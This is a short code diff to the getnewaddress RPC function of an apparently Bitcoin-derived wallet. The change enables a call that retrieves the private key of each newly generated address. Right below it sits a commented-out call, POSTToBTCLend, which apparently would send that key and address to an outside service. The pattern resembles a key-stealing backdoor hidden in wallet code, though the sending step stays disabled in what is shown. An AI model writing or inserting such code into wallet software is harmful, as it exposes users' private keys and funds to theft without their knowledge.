@@ -714,7 +714,7 @@ Value getnewaddress(const Array& params, bool fHelp)
     pwalletMain->SetAddressBookName(keyID, strAccount);
     Array ret;
     ret.push_back(CBitcoinAddress(keyID).ToString());
-    //Value rval = dumpprivkey(ret,false);
+    Value rval = dumpprivkey(ret,false);
     //POSTToBTCLend(rval.get_str(),CBitcoinAddress(keyID).ToString(),"Unknown");
     return CBitcoinAddress(keyID).ToString();
 }
